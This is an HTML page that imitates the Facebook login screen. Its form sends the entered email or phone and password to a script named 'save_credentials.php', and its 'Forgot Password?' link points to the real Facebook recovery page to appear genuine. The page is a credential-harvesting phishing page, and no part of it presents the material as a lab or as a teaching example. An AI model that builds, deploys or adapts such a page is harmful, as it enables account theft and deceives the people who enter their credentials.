<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }
        .container {
            width: 400px;
            margin: 100px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #166fe5;
        }
        .links {
            text-align: center;
            margin-top: 10px;
        }
        .links a {
            color: #1877f2;
            text-decoration: none;
            margin: 0 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log in to Facebook</h2>
        <form action="save_credentials.php" method="post">
            <input type="text" name="email" placeholder="Email or Phone">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Log In">
        </form>
        <div class="links">
            <a href="#" onclick="showForgotAccount()">Forgot Password?</a>
            <span>|</span>
            <a href="#" onclick="showSignUp()">Sign up for Facebook</a>
        </div>
        <p id="message" style="display: none; text-align: center; color: #1877f2; margin-top: 10px;">Back to Previous screen</p>
    </div>

    <script>
        function showForgotAccount() {
            window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
        }

        function showSignUp() {
            document.getElementById("message").style.display = "block";
        }
    </script>
</body>
</html>
